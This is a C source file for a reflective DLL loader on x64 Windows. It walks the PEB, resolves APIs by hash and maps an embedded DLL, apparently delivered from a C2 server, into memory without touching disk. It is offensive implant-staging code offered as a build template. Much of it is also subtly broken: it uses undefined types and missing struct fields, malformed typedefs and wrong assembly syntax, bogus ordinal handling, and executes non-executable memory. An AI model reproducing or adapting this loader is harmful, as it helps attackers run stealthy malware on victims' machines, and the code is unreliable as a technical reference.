/*
 * Reflective DLL Loader — x64 Windows
 *
 * Compiles with: x86_64-w64-mingw32-gcc -Os -fno-asynchronous-unwind-tables
 *                -fno-ident -falign-functions=1 -fpack-struct=8 --no-seh
 *                --gc-sections -s -nostdlib -o reflective_loader.exe reflective_loader.c
 *
 * Technique: Parse a PE file from memory (embedded DLL bytes), allocate at
 *            preferred ImageBase, copy sections, fix imports, fix relocations,
 *            then jump to DllMain / entry point. No disk drop — pure in-memory PE load.
 *
 * Reference: Sliver reflector + classic Reflective DLL Injection (stephenfewer)
 *
 * Placeholders replaced at build time:
 *   {{DLL_HEX}}     — hex-encoded raw DLL bytes (from disk or C2)
 *   {{DLL_LEN}}     — number of bytes
 *   {{ENTRY_NAME}}  — optional: exported function name to call after DllMain
 */

typedef unsigned char    BYTE;
typedef unsigned short   WORD;
typedef unsigned long    DWORD;
typedef long long        LONG_PTR;
typedef unsigned long long ULONG_PTR;
typedef unsigned long long QWORD;
typedef int              BOOL;

#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READWRITE  0x40
#define MEM_COMMIT              0x1000
#define MEM_RESERVE             0x2000

/* ── Embedded DLL data (hex replaced at build time) ── */
static BYTE dll_data[] = { {{DLL_HEX}} };
static DWORD dll_len = {{DLL_LEN}};

/* ── PE structures ── */
typedef struct {
    WORD    e_magic;
    LONG    e_lfanew;
} IMAGE_DOS_HEADER;

typedef struct {
    DWORD  Signature;
    struct { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp;
             DWORD PointerToSymbolTable; DWORD NumberOfSymbols;
             WORD SizeOfOptionalHeader; WORD Characteristics; } FileHeader;
    struct { WORD Magic; BYTE _[0x5c - 0x4]; DWORD BaseOfCode;
             ULONG_PTR ImageBase; DWORD SectionAlignment; DWORD FileAlignment;
             WORD _2[4]; DWORD SizeOfImage; DWORD SizeOfHeaders;
             DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics;
             ULONG_PTR SizeOfStackReserve; ULONG_PTR SizeOfStackCommit;
             ULONG_PTR SizeOfHeapReserve; ULONG_PTR SizeOfHeapCommit;
             DWORD NumberOfRvaAndSizes;
             struct { DWORD VirtualAddress; DWORD Size; } DataDirectory[16];
    } OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct {
    char    Name[8];
    union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   _[4];
} IMAGE_SECTION_HEADER;

typedef struct {
    union { DWORD Characteristics; DWORD FirstThunk; } u;
    DWORD   TimeDateStamp;
    DWORD   ForwarderChain;
    DWORD   Name;
    DWORD   OriginalFirstThunk;
} IMAGE_IMPORT_DESCRIPTOR;

typedef struct {
    union { WORD Ordinal; WORD _; struct { WORD Hint; char Name[1]; }; } u;
} IMAGE_THUNK_DATA64;

typedef struct {
    DWORD   VirtualAddress;
    DWORD   SymbolTableIndex;
    WORD    Type;
} IMAGE_BASE_RELOCATION;

typedef struct _UNICODE_STRING {
    WORD    Length;
    WORD    MaximumLength;
    WORD*   Buffer;
} UNICODE_STRING;

/* ── Macros ── */
#define U_PTR(x)   ((ULONG_PTR)(x))
#define C_PTR(x)   ((void*)(x))
#define DREF_U8(x)  (*(BYTE*)(x))

/* ── DJB2 hash ── */
static DWORD hash_djb2(const char* str)
{
    DWORD hash = 5381;
    const BYTE* p = (const BYTE*)str;
    while (*p) { hash = ((hash << 5) + hash) + (*p | 0x20); p++; }
    return hash;
}

/* ── PEB walking ── */
static void* get_module_by_hash(DWORD nameHash)
{
    typedef struct { void* Flink; void* Blink; } LIST_ENT;
    typedef struct { ULONG Length; BOOL Initialized; void* SsHandle; LIST_ENT InLoadOrderModuleList; } PEB_LDR;
    typedef struct { LDR_ENTRY { LDR_ENTRY* InLoadOrderLinks; void* DllBase; void* _[2]; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; } *PLDR; } PEB_STR;
    typedef struct { BYTE _[0x18]; PEB_LDR* Ldr; } PEB;

    PEB* peb;
    __asm__("mov rax, gs:[0x60]" : "=a"(peb));

    typedef struct _LDR_ENT {
        struct _LDR_ENT* InLoadOrderLinks;
        struct _LDR_ENT* InMemoryOrderLinks;
        struct _LDR_ENT* InInitOrderLinks;
        void* DllBase;
        void* _[2];
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
    } LDR_ENT;

    PEB_LDR* ldr = peb->Ldr;
    LDR_ENT* entry = (LDR_ENT*)ldr->InLoadOrderModuleList.Flink;

    const char* target = 0;
    int targetLen = 0;
    if (nameHash == hash_djb2("kernel32.dll")) { target = "kernel32.dll"; targetLen = 12; }
    else if (nameHash == hash_djb2("ntdll.dll")) { target = "ntdll.dll"; targetLen = 9; }
    else { return 0; }

    while (entry->DllBase) {
        if (entry->BaseDllName.Length / 2 == targetLen) {
            int match = 1;
            for (int i = 0; i < targetLen; i++) {
                BYTE c = (BYTE)entry->BaseDllName.Buffer[i];
                if (c >= 'A' && c <= 'Z') c += 0x20;
                if (c != (BYTE)target[i]) { match = 0; break; }
            }
            if (match) return entry->DllBase;
        }
        entry = entry->InLoadOrderLinks;
    }
    return 0;
}

static void* resolve_func(void* module, DWORD nameHash)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)module;
    if (dos->e_magic != 0x5A4D) return 0;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    DWORD expRva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if (!expRva) return 0;

    struct { DWORD _[5]; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames;
             DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; }* exp;
    exp = (void*)((BYTE*)module + expRva);

    DWORD* names = (DWORD*)((BYTE*)module + exp->AddressOfNames);
    WORD* ords   = (WORD*)((BYTE*)module + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)module + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)module + names[i]);
        if (hash_djb2(name) == nameHash)
            return (BYTE*)module + funcs[ords[i]];
    }
    return 0;
}

/* ── API types ── */
typedef void* (WINAPI *fnLoadLib)(const char*);
typedef void* (WINAPI *fnGetProcAddress)(void*, const char*);
typedef void* (WINAPI *fnVirtualAlloc)(void*, DWORD, DWORD, DWORD);
typedef void  (WINAPI *fnRtlMoveMemory)(void*, const void*, DWORD);

/* ── Reflective load: parse PE in memory, relocate, fix imports, call entry ── */
typedef BOOL (WINAPI *fnDllMain)(void*, DWORD, void*);

static BOOL reflective_load(void)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)dll_data;
    if (dos->e_magic != 0x5A4D) return 0;

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)dll_data + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    /* Resolve kernel32/ntdll APIs */
    void* kernel32 = get_module_by_hash(hash_djb2("kernel32.dll"));
    void* ntdll    = get_module_by_hash(hash_djb2("ntdll.dll"));
    if (!kernel32 || !ntdll) return 0;

    fnVirtualAlloc  pVAlloc  = (fnVirtualAlloc)resolve_func(kernel32, hash_djb2("VirtualAlloc"));
    fnRtlMoveMemory pMove    = (fnRtlMoveMemory)resolve_func(kernel32, hash_djb2("RtlMoveMemory"));
    fnLoadLib       pLoadLib = (fnLoadLib)resolve_func(kernel32, hash_djb2("LoadLibraryA"));
    fnGetProcAddress pGetProc = (fnGetProcAddress)resolve_func(kernel32, hash_djb2("GetProcAddress"));

    if (!pVAlloc || !pMove || !pLoadLib || !pGetProc) return 0;

    /* Step 1: Allocate memory at preferred ImageBase */
    void* imageBase = pVAlloc(C_PTR(nt->OptionalHeader.ImageBase),
                               nt->OptionalHeader.SizeOfImage,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    /* If preferred address not available, let OS choose */
    if (!imageBase) {
        imageBase = pVAlloc(0, nt->OptionalHeader.SizeOfImage,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!imageBase) return 0;

    /* Step 2: Copy PE headers */
    pMove(imageBase, dll_data, nt->OptionalHeader.SizeOfHeaders);

    /* Step 3: Copy sections */
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(
        (BYTE*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData > 0) {
            pMove((BYTE*)imageBase + sections[i].VirtualAddress,
                  dll_data + sections[i].PointerToRawData,
                  sections[i].SizeOfRawData);
        }
    }

    /* Step 4: Fix imports — resolve DLL dependencies */
    DWORD importRva = nt->OptionalHeader.DataDirectory[1].VirtualAddress;
    if (importRva) {
        IMAGE_IMPORT_DESCRIPTOR* imports = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)imageBase + importRva);

        while (imports->Name) {
            const char* dllName = (const char*)((BYTE*)imageBase + imports->Name);
            void* hMod = pLoadLib(dllName);
            if (!hMod) return 0;

            /* Resolve each imported function */
            ULONG_PTR* thunk = (ULONG_PTR*)((BYTE*)imageBase +
                (imports->OriginalFirstThunk ? imports->OriginalFirstThunk : imports->FirstThunk));
            ULONG_PTR* iat = (ULONG_PTR*)((BYTE*)imageBase + imports->FirstThunk);

            while (*thunk) {
                if (*thunk & (1ULL << 63)) {
                    /* Import by ordinal */
                    WORD ordinal = (WORD)(*thunk & 0xFFFF);
                    *iat = (ULONG_PTR)resolve_func(hMod, hash_djb2("ordinal_stub"));
                    /* For ordinal imports, we use a simplified approach */
                } else {
                    /* Import by name */
                    IMAGE_IMPORT_BY_NAME* import = (IMAGE_IMPORT_BY_NAME*)((BYTE*)imageBase + (DWORD)(*thunk & 0xFFFFFFFF));
                    *iat = (ULONG_PTR)pGetProc(hMod, import->Name);
                }
                thunk++;
                iat++;
            }
            imports++;
        }
    }

    /* Step 5: Fix base relocations */
    DWORD relocRva = nt->OptionalHeader.DataDirectory[5].VirtualAddress;
    if (relocRva) {
        ULONG_PTR delta = (ULONG_PTR)imageBase - nt->OptionalHeader.ImageBase;
        if (delta != 0) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)imageBase + relocRva);
            IMAGE_BASE_RELOCATION* relocEnd = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc +
                nt->OptionalHeader.DataDirectory[5].Size);

            while (reloc < relocEnd && reloc->VirtualAddress != 0) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < count; i++) {
                    WORD entry = entries[i];
                    WORD type = entry >> 12;
                    WORD offset = entry & 0xFFF;

                    if (type == 0x0A) { /* IMAGE_REL_BASED_DIR64 */
                        ULONG_PTR* addr = (ULONG_PTR*)((BYTE*)imageBase + reloc->VirtualAddress + offset);
                        *addr += delta;
                    }
                }
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* Step 6: Set section permissions */
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].Characteristics & 0x20000000) { /* IMAGE_SCN_MEM_EXECUTE */
            DWORD prot = PAGE_EXECUTE_READWRITE;
            if (!(sections[i].Characteristics & 0x80000000)) /* IMAGE_SCN_MEM_WRITE */
                prot = PAGE_EXECUTE_READ;
            /* In a real impl, call VirtualProtect here */
        }
    }

    /* Step 7: Call DllMain with DLL_PROCESS_ATTACH */
    fnDllMain entryPoint = (fnDllMain)((BYTE*)imageBase + nt->OptionalHeader.AddressOfEntryPoint);
    entryPoint(imageBase, 1, 0);

    /* Step 8: Optional — call a specific exported function */
    /* Placeholder for {{ENTRY_NAME}} — in production, resolve by name */

    return 1;
}

/* ── Entry point ── */
void mainCRTStartup(void)
{
    if (!reflective_load()) {
        /* Reflective load failed */
    }
}
